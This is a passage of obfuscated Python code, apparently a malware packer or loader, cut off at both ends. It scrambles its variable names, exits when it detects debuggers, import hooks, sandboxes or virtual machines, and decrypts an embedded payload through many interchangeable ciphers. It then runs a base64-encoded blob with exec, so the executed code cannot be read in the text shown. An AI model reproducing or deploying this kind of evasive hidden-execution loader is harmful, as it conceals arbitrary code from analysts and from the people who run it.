    _ozpavmjdc = bytes.fromhex("f4dadcf98ceddad3cecbf3f2ebd5ffeed0d58cda8a8bf28ef8efffcefe84f2fcdfcbfbd0dfd4d2f58ccdd9cf898bebcff58bcfcef2d8f3fed7fff6d88488ee8e8ad9c4c485eecaf3f58ffeebe7d9f6d68aebffe5f4eaccfff7f6d8dbf9fbfee5feecfac78ef5fffbf18ef2f0e5f6e88ffcd4e5dad18bf8f5d1fa8aca8dcccccb88fbc8d1ecfc8c84efd788edd2d585cae9effad3fceadfedcbc784ebfeeafcc9c9f584cfffd2e9e4d484fbffcee5cbd8eefcd588f6fbcaece9d1f4f2fcc7efdefeecf088f8f2dcd785fad1f8f2cbdf8afae7f9d6f7c4cdd5c7d5f98f8c85cfd3f7f88ecadfd6f0eecb8bf4dfebf0f5ffccf9e9cbf0d384d5848ccee4efd0eafbc5dbfee9f3dc8bcadfd1faf4c985f6c9c4dee9edecdac5db8df0d7f3d4ff85eececee7cde9d58bcdcef3f08df6caf28bf4ecd1dae9c9f6f6f78dd78cead3d9dafad4caf9dad2ebf1d6e5d3f8edd5f3c9efd6de85fb84d3d8f084cc8efcfae4d58c8adaecd9fef9d7c98e8dfaf18ff1ced289dcccd5e7fa88888afa8d85d6fcd2c8cacaf8cf8ecef2ec8dfafee78aca8cfbf68cd98fd2dbd4c8e9efe4f5d2cdf6e5c78dc4dbf0cced8ed1888ffbd6d0e9cac78d8bcedecee8f0c9f4f388faffedebece585c4cae9c5d484d8dad6eefee4e9ccfbf6e9d5df88f1d6d3c7d8fbd4c8c8dad0feecc4dbedca8aeaffcffce5edf4de8cf6c8f4ffcac8d9d5ea89c88585f0c8d5dfdecd8ffbfbdaccf8ebf8fcd8e9f7c4e48dfacbde85f384cdffc4eafc8acdd6faeadbd98ad8f5ffdb89e984d8f68adae8e7d7f2cacdd2cacaf684fafcd0f7c7c9f5f0ffe8effee484d2d8c5e9caf08fedf385c7f8f08edfcb85cdd0ea89df85c48cdfedebd3cfeadeffd4d5d28bd1feffd7cc8eecfcf5decdeed68fe4c4caf8c589c9d9e8f0edd7d4ff88e8f6f6898ac9cf8ae7f5d8ccf2dedff9eaf2f8caecdceeef89e8fcedff85def1d2f1f1d2e4fcf9d0ded3d8cfdcf585e588d3cfedc7f7cac9fff3eaeff7de8bcefcf5cd888f8bd0f1d1f6d2d5e4dbc7cfd9e9f5cfd1cbdf88f0f1f38cfbf6f2ebc589ecdad0ea84f18afafffaedf289ca84ffccf6eae4d0f7d388f4d2f4e7caf0eeebecdaf1e58af5d4f58ee8ead6dcfbcee8d2f5d3fed38ff1ecf4ecf0cddae5f5e8dae58acdd7e8fecdd5fadc89d08e8af8ffd9f8cceacbd1c4dbcec5fff2f6d6def4fbffeae9e7e5dae5cf8dd7e7c8c4cac8cff88ffedcd58de8c9f6f8d1ffe9ebd1f3e8ecfcdcebf7e48fc4c5eeeae4d389f388eddbe58bfede8acdf8f98d8acee9effff1e5d3fce5cdebf5cbecfcdfe7d48bedf3fad5defedfedd0f7ebf0dfd8d7d4c58be884f7e9e4efdedaded8fbe9cd84c78bf4c4f1d48b8cedc4eb898fe8d3facfcedcd4f5ffebd6c8f3f188f1ca8af9e88f8e88e4fbf2d9d0efe9e7cdfbf6c7d5fbd6dff0c5dfebdce488cecaff")
    _ozpavmjdc = bytes(_ ^ 189 for _ in _ozpavmjdc).decode()
    _kzmuxh.breakpointhook = None
    for _qm in ('pydevd','pdb','ipdb','pdbpp','pydevconsole'):
        if _qm in _kzmuxh.modules:
            _kzmuxh.stderr.write('error: debugger detected\n'); _kzmuxh.exit(1)
    _zoicqg = _nekcm.b64decode(_ssiqzv)
    for _qn in ('__import__','compile','exec'):
        _qf = getattr(_kzmuxh.modules.get('builtins'), _qn, None)
        if _qf is not None:
            _qg = getattr(_qf, '__name__', '')
            if _qg != _qn:
                _kzmuxh.stderr.write('error: hook detected\n'); _kzmuxh.exit(1)
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher as _mdpjc, algorithms as _zrldyp, modes as _xxelftcz
    except ImportError:
        _kzmuxh.stderr.write("error: cryptography not installed\n"); _kzmuxh.exit(1)

    if len(_kzmuxh.meta_path) > 5:
        _kzmuxh.stderr.write('error: import hook detected\n'); _kzmuxh.exit(1)
    if getattr(_kzmuxh, 'flags', None) and _kzmuxh.flags.no_user_site:
        _kzmuxh.stderr.write('error: sandbox detected\n'); _kzmuxh.exit(1)
    import os
    if any(x in str(_kzmuxh.platform) or any(y in os.listdir('/proc/sys/kernel') for y in ['//', 'vm']) for x in ['vmware', 'virtualbox', 'qemu']):
        _kzmuxh.stderr.write('error: virtual machine detected\n'); _kzmuxh.exit(1)
    if _vqkbcm == 1:
        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=80)
        _zqlvo = _ryptlntrv[:32]; _tfpbc = _ryptlntrv[32:48]; _aackahai = _ryptlntrv[48:80]
        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
        _xzlpmi = _mdpjc(_zrldyp.AES(_zqlvo), _xxelftcz.CBC(_tfpbc))
        _hejxfn = _xzlpmi.decryptor()
        _hejxfn = _hejxfn.update(_wwgwruiwx) + _hejxfn.finalize()
        _ippspzu = _hejxfn[-1]
        if _ippspzu < 1 or _ippspzu > 16 or not all(_ == _ippspzu for _ in _hejxfn[-_ippspzu:]):
            _kzmuxh.stderr.write("error: decryption failed\n"); _kzmuxh.exit(1)
        _hejxfn = _hejxfn[:-_ippspzu]
    elif _vqkbcm == 7:
        _hejxfn = _nekcm.b32decode(_zoicqg)
    elif _vqkbcm == 4:
        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=80)
        _zqlvo = _ryptlntrv[:32]; _tfpbc = _ryptlntrv[32:48]; _aackahai = _ryptlntrv[48:80]
        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
        _xzlpmi = _mdpjc(_zrldyp.ChaCha20(_zqlvo, _tfpbc), mode=None)
        _hejxfn = _xzlpmi.decryptor().update(_wwgwruiwx)
    elif _vqkbcm == 13:
        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=80)
        _zqlvo = _ryptlntrv[:32]; _tfpbc = _ryptlntrv[32:48]; _aackahai = _ryptlntrv[48:80]
        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
        import struct as _agcdbge
        def _rfoacoaks(k,c,n):
            s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]
            for i in range(0,32,4):s.append(_agcdbge.unpack('<I',k[i:i+4])[0])
            s.append(c&0xFFFFFFFF)
            for i in range(0,12,4):s.append(_agcdbge.unpack('<I',n[i:i+4])[0])
            w=list(s)
            def q(a,b,c,d):
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<16)|(d>>16))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<12)|(b>>20))&0xFFFFFFFF
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<8)|(d>>24))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<7)|(b>>25))&0xFFFFFFFF
                return a,b,c,d
            for _ in range(10):
                w[0],w[4],w[8],w[12]=q(w[0],w[4],w[8],w[12])
                w[1],w[5],w[9],w[13]=q(w[1],w[5],w[9],w[13])
                w[2],w[6],w[10],w[14]=q(w[2],w[6],w[10],w[14])
                w[3],w[7],w[11],w[15]=q(w[3],w[7],w[11],w[15])
                w[0],w[5],w[10],w[15]=q(w[0],w[5],w[10],w[15])
                w[1],w[6],w[11],w[12]=q(w[1],w[6],w[11],w[12])
                w[2],w[7],w[8],w[13]=q(w[2],w[7],w[8],w[13])
                w[3],w[4],w[9],w[14]=q(w[3],w[4],w[9],w[14])
            r=bytearray()
            for i in range(16):r.extend(_agcdbge.pack('<I',(s[i]+w[i])&0xFFFFFFFF))
            return bytes(r)
        _btiag = _agcdbge.unpack('<I',_tfpbc[:4])[0]
        _tfpbc = _tfpbc[4:]
        _xdgbgv = bytearray()
        while len(_xdgbgv) < len(_wwgwruiwx):
            _ippspzu = _rfoacoaks(_zqlvo, _btiag, _tfpbc)
            for _zeqyjzfv in range(min(64, len(_wwgwruiwx) - len(_xdgbgv))):
                _xdgbgv.append(_wwgwruiwx[len(_xdgbgv)] ^ _ippspzu[_zeqyjzfv])
            _btiag += 1
        _hejxfn = bytes(_xdgbgv)
    elif _vqkbcm == 12:
        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=64)
        _zqlvo = _ryptlntrv[:32]; _aackahai = _ryptlntrv[32:64]
        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
        _ippspzu = 3 + (_xdgbgv[0] & 7)
        _xdgbgv = bytearray(_wwgwruiwx)
        for _btiag in range(_ippspzu - 1, -1, -1):
            _rfoacoaks = (3 + _btiag) & 7
            _zeqyjzfv = (_btiag * 0x1B + 0x5A) & 0xFF
            for _tfpbc in range(len(_xdgbgv)):
                _ippspzu = _xdgbgv[_tfpbc]
                _ippspzu ^= _zeqyjzfv
                _ippspzu = ((_ippspzu >> _rfoacoaks) | ((_ippspzu << (8 - _rfoacoaks)) & 0xFF))
                _ippspzu ^= _zqlvo[(_btiag * len(_xdgbgv) + _tfpbc) % len(_zqlvo)]
                _xdgbgv[_tfpbc] = _ippspzu
        _hejxfn = bytes(_xdgbgv)
    elif _vqkbcm == 8:
        _ldvxgkjl = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _icznco = {c:i for i,c in enumerate(_ldvxgkjl)}
        def _alfnsb(_tmtow):
            _uogyjf = bytearray(); _uorhw = 0
            while _uorhw < len(_tmtow):
                _glwxpyk = 0; _ndxey = 0
                while _uorhw < len(_tmtow) and _ndxey < 5:
                    _glwxpyk = _glwxpyk * 85 + _icznco[chr(_tmtow[_uorhw])]; _uorhw += 1; _ndxey += 1
                _xngshu = _ndxey - 1
                if _xngshu > 0: _uogyjf.extend(_glwxpyk.to_bytes(4, 'big')[4-_xngshu:])
            return bytes(_uogyjf)
        _hejxfn = _alfnsb(_zoicqg)
    elif _vqkbcm == 11:
        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=64)
        _zqlvo = _ryptlntrv[:32]; _aackahai = _ryptlntrv[32:64]
        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
        _ippspzu = _zqlvo[0]
        _hejxfn = bytearray()
        for _btiag in range(len(_wwgwruiwx)):
            _xdgbgv = _wwgwruiwx[_btiag] ^ _ippspzu
            _hejxfn.append(_xdgbgv)
            _ippspzu = _wwgwruiwx[_btiag] ^ _zqlvo[ (_btiag + 1) % len(_zqlvo) ]
            _ippspzu = (((_ippspzu << 3) & 0xFF) | (_ippspzu >> 5)) ^ 0x5A
        _hejxfn = bytes(_hejxfn)
    elif _vqkbcm == 5:
        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=64)
        _zqlvo = _ryptlntrv[:32]; _aackahai = _ryptlntrv[32:64]
        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
        _hejxfn = bytes(_wwgwruiwx[i] ^ _zqlvo[i % 32] for i in range(len(_wwgwruiwx)))
    elif _vqkbcm == 6:
        _hejxfn = _nekcm.b64decode(_zoicqg)
    elif _vqkbcm == 0:
        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=64)
        _zqlvo = _ryptlntrv[:32]; _aackahai = _ryptlntrv[32:64]
        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
        _xzlpmi = _mdpjc(_zrldyp.AES(_zqlvo), _xxelftcz.ECB())
        _hejxfn = _xzlpmi.decryptor()
        _hejxfn = _hejxfn.update(_wwgwruiwx) + _hejxfn.finalize()
        _ippspzu = _hejxfn[-1]
        if _ippspzu < 1 or _ippspzu > 16 or not all(_ == _ippspzu for _ in _hejxfn[-_ippspzu:]):
            _kzmuxh.stderr.write("error: decryption failed\n"); _kzmuxh.exit(1)
        _hejxfn = _hejxfn[:-_ippspzu]
    elif _vqkbcm == 2:
        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _wwgwruiwx = _zoicqg[16:-32]
        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=80)
        _zqlvo = _ryptlntrv[:32]; _tfpbc = _ryptlntrv[32:48]; _aackahai = _ryptlntrv[48:80]
        _rimktbd = _dpweyflet.new(_aackahai, _wwgwruiwx, digestmod='sha256').digest()
        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
        _xzlpmi = _mdpjc(_zrldyp.AES(_zqlvo), _xxelftcz.CTR(_tfpbc))
        _hejxfn = _xzlpmi.decryptor().update(_wwgwruiwx)
    elif _vqkbcm == 10:
        _hejxfn = bytes.fromhex(_zoicqg.decode('ascii'))
    elif _vqkbcm == 3:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _wlhlx
        _xdgbgv = _zoicqg[:16]; _wnhydog = _zoicqg[-32:]; _hejxfn = _zoicqg[16:-32]
        _wwgwruiwx = _hejxfn[:-16]; _ippspzu = _hejxfn[-16:]
        _ryptlntrv = _ooyjwkgp.pbkdf2_hmac('sha256', _ozpavmjdc.encode(), _xdgbgv, 100000, dklen=76)
        _zqlvo = _ryptlntrv[:32]; _tfpbc = _ryptlntrv[32:44]; _aackahai = _ryptlntrv[44:76]
        _rimktbd = _dpweyflet.new(_aackahai, _hejxfn, digestmod='sha256').digest()
        if not _dpweyflet.compare_digest(_wnhydog, _rimktbd):
            _kzmuxh.stderr.write("error: integrity check failed\n"); _kzmuxh.exit(1)
        _hejxfn = _wlhlx(_zqlvo).decrypt(_tfpbc, _wwgwruiwx + _ippspzu, None)
    elif _vqkbcm == 9:
        def _hegoaufh(_zqexnvx):
            if _zqexnvx[:2] == b'<~': _zqexnvx = _zqexnvx[2:]
            if _zqexnvx[-2:] == b'~>': _zqexnvx = _zqexnvx[:-2]
            _skcrod = bytearray(); _mqjgzd = 0
            while _mqjgzd < len(_zqexnvx):
                if _zqexnvx[_mqjgzd] == 122:
                    _skcrod.extend(b'\x00\x00\x00\x00'); _mqjgzd += 1; continue
                _hjpvlj = 0; _vebllya = 0
                while _mqjgzd < len(_zqexnvx) and _vebllya < 5:
                    _hjpvlj = _hjpvlj * 85 + (_zqexnvx[_mqjgzd] - 33); _mqjgzd += 1; _vebllya += 1
                _vzaheswhv = _vebllya - 1
                if _vzaheswhv > 0: _skcrod.extend(_hjpvlj.to_bytes(4, 'big')[4-_vzaheswhv:])
            return bytes(_skcrod)
        _hejxfn = _hegoaufh(_zoicqg)
    else:
        _kzmuxh.stderr.write("error: unsupported algorithm\n"); _kzmuxh.exit(1)
    _vk = bytes.fromhex("29cc200cb9e4ce40f32507a0f203e7aadec12407cd8c61baac095c77bf84c4cb")
    _vn = bytes.fromhex("5678ab2e2c3a06e319f706e4dc0c927f")
    _sig = _hejxfn[-32:]
    _pl = _hejxfn[4:-32]
    import hmac, hashlib
    if not hmac.compare_digest(_sig, hmac.new(_vk, _pl, hashlib.sha256).digest()):
        _kzmuxh.stderr.write('error: VM integrity check failed\n'); _kzmuxh.exit(1)
    _pd = bytes([_pl[i] ^ _vk[i % 32] ^ _vn[i % 16] for i in range(len(_pl))])
    if _hejxfn[1] == 1:
        import zlib as _ofumrabw
        _pd = _ofumrabw.decompress(_pd)
    elif _hejxfn[1] == 2:
        import lzma as _ofumrabw
        _pd = _ofumrabw.decompress(_pd)
    elif _hejxfn[1] == 3:
        import bz2 as _ofumrabw
        _pd = _ofumrabw.decompress(_pd)
    elif _hejxfn[1] == 4:
        import brotli as _ofumrabw
        _pd = _ofumrabw.decompress(_pd)
    elif _hejxfn[1] == 5:
        import zstandard as _ofumrabw
        _pd = _ofumrabw.decompress(_pd)
    elif _hejxfn[1] == 6:
        import gzip as _ofumrabw
        _pd = _ofumrabw.decompress(_pd)
    elif _hejxfn[1] == 7:
        import lz4.frame as _ofumrabw
        _pd = _ofumrabw.decompress(_pd)
    elif _hejxfn[1] == 8:
        import snappy as _ofumrabw
        _pd = _ofumrabw.decompress(_pd)
    elif _hejxfn[1] == 9:
        import gzip as _ofumrabw
        _pd = _ofumrabw.decompress(_pd)
    elif _hejxfn[1] == 10:
        import blosc as _ofumrabw
        _pd = _ofumrabw.decompress(_pd)
    else:
        pass
    _c, _k, _m, _map, _ok, _ht, _pf = _vm_deserialize(_pd)
    exec(compile(_nekcm.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGhtYWMKaW1wb3J0IGN0eXBlcwpfRlVOQ19LRVkgPSBiYXNlNjQuYjY0ZGVjb2RlKCcwQnN0RXphRFRkUVVFTHhYTmVJVVRyOHRJRjZ3T3FCdFV0aTJhbjFXcEhRPScpCl9GRU5DX0RBVEEgPSBbYmFzZTY0LmI2NGRlY29kZSgnNnE3NHRKWFF6am5nQXJIemF6WHBwc3k0N3BEV0xmSEFVUWpwcEJlc2M2c2d0ZHZ6aFVpbnQwTjA4ZGlrK2dHaGZ0R3JuQSthM3hacHAwVXJsM3ZYNEZlOVowNW9xVlc0bEswVHI0bG84eE5lcVVJRXN3VjZGM05wWGIwYTRacnpwcGpQOXZsblRiT1dLTHZ6L3dWVDBrZ0VsMzkzbUh2Q3JiK2d0ZHpzb2trV3Z4MVNOb2RUK3BkRUJSdUFNam1ObDJyYUNvMURlUVd1NzNxYkNQdE5uSlZoeG9UVTNEcjg3OCtaUjhxak11emdNaHFFL1puNUNUT3ZGc0NZT3JRdmFKM29CMmcwcEZKNExIaC9UZDc3TW16RFpyVnFmSUpHVlBHQnBnUmx3d0tHamc9PScpLCBiYXNlNjQuYjY0ZGVjb2RlKCdjYlBBS2s4a2xRT0t5b0QvbjhzS1A3Tk5URTBUWGk3clZaeGVBcE1DaGNGeEJsK2p3Nk1ZbE9RdEhJbGtGb2w5UWlKZ1BoRXF3QlR4aXRabHFaTzZZNFBVZXVtcjNpOE5nQ1lCbFY3Q1hTWjNvb1B2SDNrWjkrYU1KOE1kQ0xXYXdzUXpmUVJ6RkVtTHhwWk1qaG1lYWhuSDdOSTB0c3JzS3h4aDFFKy8xNUx2Mk1peUdQbmtUWUZpcGJmSThYTmxkNFgvcTJYdjZkRFZMdThyT2Q4MlhOSFByTHBQa0w1RWdYTjhkME5odHRHYkhUdklpa000QzcxaCtnNHhXN0VsTE1sTFlGVjZQb2F3QTlQTHFKalpCMUJ6OHlvPScpLCBiYXNlNjQuYjY0ZGVjb2RlKCcyY1lYOFB6Y2RCRE5id3hOMm9rVSthRWxyVEYyNWVWVEtXZlFTVjBwQ0U3blBVc1g4WXlRS1B2TXZsU3hObFg1T0trb21kOHl6Q0cvZ2dIV0JyMWZwVGwwODFqdnNZV2U1dzRnMDdNZkVzU0pJaXIzYVJmM0R1NFkyNWE4d0wyUlQ5Z0hkZVVKR2tGNFFlM1UwTHltVU9iZVVWSkxXT3h1eVhLalJNRVh1SlpnV2RMNGlldU85bmkrT0IvS3NqemQxaDFkaDE2a0VKamkrOGN3dnhRR29hYXp2eVoxWk9RQkdaaTVWcERmM3BmWThRRDZPN25FbVZTdUYveFNlTFkwV2xPcmRWT2M2RW9iMzRmYk9PRzE1ZmRTNTNUeTNyZlVLVTJvVmE1M1NCY2xCd2FFaC9LUFBQNzk2M3ZWRis3M01OcGQ5RmwwL25CWXkrWmR6ZGRFWnc9PScpLCBiYXNlNjQuYjY0ZGVjb2RlKCd4U1Bqb1hzOVZFa1UvVDRhOThnK2ViUjNPODJqTlQ0SDFoMUF6c0duSittZldNTEdTUjFTVHBJdTlGVG92dUdHK1lRTjlrYUVQVVBaU1RNb1A1VUExU1NnQUdjbDJRQXh2dWxic25aM0dDS0FBTlB4UWxxUXV6MXliRUM1cnJta29RaUxTUXBJSzh6WFR4dFgzNThaS2hLdC9PdXJvbkxoTHV6VHpMZXRiSXNJSDVxNlZDNDl2WW11cFdmZlU2Z1pXeFpTYjBuVy9ZNTBMOU8wTjNRL281eTdET1pNczR0bmhLNmVyYTZSMlE5eFZZK1pPUmpsdDdsNi9GcjdaZjJBTVVUTi9FZEd1Zjkxck5zSEtKVE9RUk5QVG43blVDZnJwckNXV1lnRGJHMVRNRUY4bzhIeUxYQlk4eUV1V2xWUHcxRXpaSzZ0ZzZlSjhFV0ZZQlJodExLRlB1V1RrRG11c013QmtxeGp5UEJKR3BGSzQ4K0JsUXZ2UmlHcDV6UXQydEREYUxQczNoNkg1TXlPUDVVQkJpN29IS0ZCR0dhbmpDcGxxRGNBckFQZG0zN3RrL3BiaVBaVE00QVlnK3RPV2RZcGNabmdiUG50TDZ0SUs3TnplYUN2UlZaT3BuallSeUlqRWcxejZENVpnSUZsNlNONENNTzVLV1N0K1dzWEVobzFNRVIrRkMwL0tRRXlvRElaTGVMMGFvNGFLaDhTeDd5NENIM3N6YjFuOXU1VHg5MjhFbmtCU2tLMDZGRkVzTGFtak5Ta2Y0aGk4SlVkSU5GQ1hqWWc3SlVVcG1jTDFacWt4bDh1Q1h6blJXbGhpR1QxYk42a2FvVnNHSFUyREhud1ZWOHU4SVZFTVNYaDBGakM3WkZyRXdZbWFOa0VNQ1dhMUNlVFo3WGRvQUJ6NHZadFI0MWtHTkxRZXVoYUtlbTkyVmtRZWZxWTZvSGduVEMvN05jMzJ5UWFLSGt2dE5wNWhrVzJ5TzZYQzF0cnZrMlZXdTZKV1c0dlhNYUhBUFlaRkJ6a21HemU5akdQcG5rSnMzTHNuT25CR3h6aG9wR0tVUXozekNKMS96ZUczYXZtdkhtQUpzUWJwSUEzVzdjSi9mL2VhdDJsSXNiN2liOE5FVWFKY3JTUEkwME5UdTU0dnJ1RDRLOUtJWHFhdlJRTTc0Ukp1elRIVDY3ZUhRT0NuRkVGMFJ3ejFLUHFoOTJrVlkwUVBiZlZnNUYxOXY1RXJSUVdoczUrZ1VPWmxXK29OdUNoaG4vL1R2dS80YmtXMGdrZlVWRHAyQ0hlbzMrNU5kaWt4Z1R4TmZScktLckxYdGJLNWNnQWVOVmVlNTAzdGFNUWQ3VVRnQkVGb0U0bUdKcCtib2FjMDluOTNZQUkrSnhuOCtjekVuV2dzcW9GOStGSkxIeUNwMThvaUxJNXh0Z3N1azNzTks1MDRZMXFUU2tiQ1ZMR2ZCWlJHcGVIcThDQWZmYUxJODFXcVRvS3YrOW5rMjZQTlFrM09PNk53N29nNlk3blRQcTlGb01OS1FQWFRvNFNCMEpvOGpWQmNSN3l6cm9pTUtwSmdWT2RVWHZMZi84cHJZQ0dkamZKcHkvczJOTTcwek1JQmhmbGlpRjc3ZmZXVDE0eW5UOGFKNisvZzVlR3RoSlR5aHpZN1VjNGcydFA5OVFOU1ViUWxwaUJaSjBEWFUvck5jL2ppN0V0SjIxdDdSa1FoNzY1S04xSUZkUk5wZTlKYk9jenJwNFpwRmRlVHUySlNhMWVUd2d5NFlJQjhaQ2RleGdpTlZoVkxIZEc5SkxLZDZHa2ZqeS9WUTlxN0dldVIwT3dmV1RmOWR1V1duYzFsSjlBS1YxelNBQ2ViWUtmYXhKaXdGbVAzVHB0aW1UUkJZc3UwaXJIbDQvMkhaMVVKSlptWXRXcjYxeVIzaUxZeDdvbTlhakNwQ04wbUxMRExlaDAvNmZWKzRYWjc3cFF6MlJCZFhPdHFRTC9kZy9Xb0sxcXpSaGc5MGpqMkVHNUtRUTR6Z0ZPODg5VndxUXp1R3RDdXpCRUdLK1NSY25xMmZTTjV0RTBDRmVvZjdML2Q5Qm1yZUp4ajh1Z3NiRUszNGRmNlpOb1ZDVEszK2tlRG1yK2hUOTd5R1lVNWhSZzdvd0tHZEROZ3hNQ1dLZFZsNjJkamI2MFUyeEdkb3ZwdGdRZW5xc28vWktJaUJJeWxWT2JMZHFjWTQ2TnYvWVlBL3FGRktlSVp5RDRaZzBMWWdEOTR2S3p3R1VSNHNQWVVQT2VObk4wbUdVU0dGbXBkS1RVOHJkRGNRMmF6RG4zdlBucm4vQ2NCbkZMM2VSYkIxYy9jRFNhbE9QZUxhbG82QzhWeHJaWnVEUnNNMlh2dTNuTHpGTks0L2dESGlmUHZxRW1XSjZwMTM3cUtGZ3hhVTk2Y0Nkb2FaQ3RQRXJGb0NWOG5yMExTTTI4M3R6WHZLTzJpQlBGMjVlSWRoNEtORk92c29ZVytVdE53YVdDY2Nra3F4Y2JMRUNmWnhFdmN4dkx5ZndIaWVBTm1taCtsdXZ6NnZmUzh4RGQxR2hxMVM5SlRPZXVkRXkwdFlkZThBcEpQbHpTNzJJa1NTcS9FS0lGR0cwcjM1eHVSbTdMLzBvTzl5ZWJndlRFdEtMN1BCM2k5VmRuR0VoRTBDaTgzNE02QUNqNXZVZG9oYXYycGVZb3dPNGwwQUFNdDV2RXM2b1RYNThlYkI2M3RmZ2F4WkdVWHVJaGxnMi9Pb2d3UUFHaVczOFlTa3ZlK01vQ0RuYU1BRzdualVIemZpZjVwR3h5Y1pGU2ZmUHZCeGwxMWF2U01JU1R6WUF0SWEvN2JtVlM3bGJ4OTRIWkdCbFVYeXd1NEpoZkRFMzNsOGczMjhLejlTR0MxLzhrWGNtek5XQlU3b1hON2hQSWNRekF5RzAxdHFWajlJb3JPMGlJM3NuRWJOcXEvTUZIc3ZIeE50djB4ZXpCUFdTdU1wbExFOWM3NURIYndlWlRwLzE0U0xvOUFwcXB0ZWhyVDFaRkxjRFRWRk81OFh5QWhZa0lCZ2VLZmpoazV2b2pxQ2I4Q0Y0SWFXdE1uUS92VDlNRzhMSldWeVFWUDB2bnZGRHhTOGRmYnBrQ1hGOUt6bmE1ZDFvT1BJKzFMenZaKzMxNnNBbWpub2Y4Rnp5VHdyZUh1eTV0Q1k5STZUMWU3K1dUUlc5TVhOd2tiZy9WL2RDeFI3WmVrRXZMa1ExenVJbDZ6akgwSGJLM0FYQU1pZGVxWERLVUx1ajArc3UvbkNWQWdKNnRjdjdtYUNkVW1XQkx4Ti9WVXJIYkZQSVFDK2ZiTUlLazl3cW0yZUs0bDdvY0JIelBocTd6eTZ5a3htZVFNVFN1WnVPcHFnVnMrckxHb2VtTnJ1Vk9rWkgxN2p2VlBMdWZyUFgxWEJNYlo0MGZZb2orSnpCRWxHRzE0VHV2aXJpanJyS24xZnpRRDRwS0tSa3BTMlQwcUMwcE9uay94ZmszUE5jeGU4b0ZOeExqK2s0cVQrWTFmNVFhcy8wRU42bUNqN2RSVnlEcHY2TDhtU0JoSkVERVBlKzVNQzYwMnNnQUZwc3hscStPMVhnWG50UEtWWGNHU0I1R2tTaUtxYUxlcEpnUzZtM3Qxemg0TnRhcVBia2VmSTNza3NkYUtsUG52K0grY2QzM0ZxMFNlSW14SHJHVGN2ZTRWY3hmSkVaTjV1SndzbjNEQ2JLM